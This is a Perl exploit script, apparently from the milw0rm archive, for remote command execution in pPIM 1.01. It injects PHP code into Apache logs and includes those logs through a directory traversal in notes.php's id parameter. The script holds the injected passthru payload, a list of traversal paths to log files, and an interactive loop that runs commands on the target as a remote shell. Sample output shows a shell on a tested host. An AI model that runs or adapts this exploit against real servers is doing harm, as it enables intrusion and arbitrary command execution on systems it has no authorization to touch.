#!/usr/bin/perl
####################################################################
# pPIM 1.01 (notes.php id) Remote Command Execution Exploit
# url: http://www.phlatline.org/docs/files/ppim.zip
#
# Author: Jose Luis Gongora Fernandez (a.k.a) JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://www.hack0wn.com/
# team: Spanish Hackers Team - [SHT]
#
# thanks for the base code: CWH Underground
# but I changed many things and fix bugs.
#
# Hack0wn Security Project!!
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
####################################################################
# OUTPUT: (tested on localhost)
#
# Trying to Inject the Code...
# Successfully injected in ../../../../../../../var/log/apache2/access.log
#
# [shell]:~$ id
#  uid=33(www-data) gid=33(www-data) groups=33(www-data)
# [shell]:~$ uname -a
#  Linux h4x0rz 2.6.18-6-686 #1 SMP Sat Dec 27 09:31:05 UTC 2008 i686 GNU/Linux
# [shell]:~$ exit
# joss@h4x0rz:~/Desktop$


        use LWP::UserAgent;
	use IO::Socket;
	use LWP::Simple;

	
	@apache=(
        "../../../../../../../apache/logs/error.log",
	"../../../../../../../apache/logs/access.log",
	"../../../../../../../apache/logs/error.log",
	"../../../../../../../apache/logs/access.log",
	"../../../../../../../apache/logs/error.log",
	"../../../../../../../apache/logs/access.log",
	"../../../../../../../etc/httpd/logs/acces_log",
	"../../../../../../../etc/httpd/logs/acces.log",
	"../../../../../../../etc/httpd/logs/error_log",
	"../../../../../../../etc/httpd/logs/error.log",
	"../../../../../../../var/www/logs/access_log",
	"../../../../../../../var/www/logs/access.log",
	"../../../../../../../usr/local/apache/logs/access_log",
	"../../../../../../../usr/local/apache/logs/access.log",
	"../../../../../../../var/log/apache/access_log",
	"../../../../../../../var/log/apache2/access_log",
	"../../../../../../../var/log/apache/access.log",
	"../../../../../../../var/log/apache2/access.log",
	"../../../../../../../var/log/access_log",
	"../../../../../../../var/log/access.log",
	"../../../../../../../var/www/logs/error_log",
	"../../../../../../../var/www/logs/error.log",
	"../../../../../../../usr/local/apache/logs/error_log",
	"../../../../../../../usr/local/apache/logs/error.log",
	"../../../../../../../var/log/apache/error_log",
	"../../../../../../../var/log/apache2/error_log",
	"../../../../../../../var/log/apache/error.log",
	"../../../../../../../var/log/apache2/error.log",
	"../../../../../../../var/log/error_log",
	"../../../../../../../var/log/error.log",
	"../../../../../var/log/access_log",
	"../../../../../var/log/access_log"
	);

	system(($^O eq 'MSWin32') ? 'cls' : 'clear');

        print "#######################################################################\n";
        print "# pPIM 1.01 (notes.php id) Remote Command Execution Exploit | By JosS #\n";
        print "#######################################################################\n\n";


        if (!$ARGV[0])
           {
             print "Usage: perl exploit.pl [host]\n";
             print "       perl exploit.pl localhost\n\n";
        exit;}

	$host=$ARGV[0];
        $path="/notes.php?mode=edit&id="; # change if it is necesary

	# if ( $host   =~   /^http:/ ) {$host =~ s/http:\/\///g;}
	
	print "\nTrying to Inject the Code...\n";
	$CODE="<? passthru(\$_GET[cmd]) ?>";
	$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Could not connect to host.\n\n";
	print $socket "GET /images/"."\#\#%\$\$%\#\#".$CODE."\#\#%\$\$%\#\#" . "HTTP/1.1";
	print $socket "Host: ".$host."\r\n";
	print $socket "Connection: close\r\n\r\n";
	close($socket);
	
	 if ( $host   !~   /^http:/ ) {$host = "http://" . $host;}
	
	foreach $getlog(@apache)
                {
                  chomp($getlog);          
		  $find= $host.$path.$getlog; # $find= $host.$path.$getlog."%00";
                  $xpl = LWP::UserAgent->new() or die "Could not initialize browser\n";
		  $req = HTTP::Request->new(GET => $find);
		  $res = $xpl->request($req);
		  $info = $res->content;
                  if($info =~ /\#\#\%\$\$\%\#\#/) # change if it is necesary
                  {print "Successfully injected in $getlog \n\n";$log=$getlog; last;}
                }
	
	print "[shell]:~\$ ";
	chomp( $cmd = <STDIN> );
	
	while($cmd !~ "exit") {   
			 $shell= $host.$path.$log."&cmd=$cmd"; # $shell= $host.$path.$log."%00&cmd=$cmd";
			 $xpl = LWP::UserAgent->new() or die "Could not initialize browser\n";
			 $req = HTTP::Request->new(GET => $shell);
			 $res = $xpl->request($req);
			 $info = $res->content; 
				 if ($info =~ /\#\#%\$\$%\#\#(.*?)\#\#%\$\$%\#\#/sg) 
				 {print $1;}
			 print "[shell]:~\$ ";
			 chomp( $cmd = <STDIN> ); 
	}

          
        # __h0__

# milw0rm.com [2009-02-23]
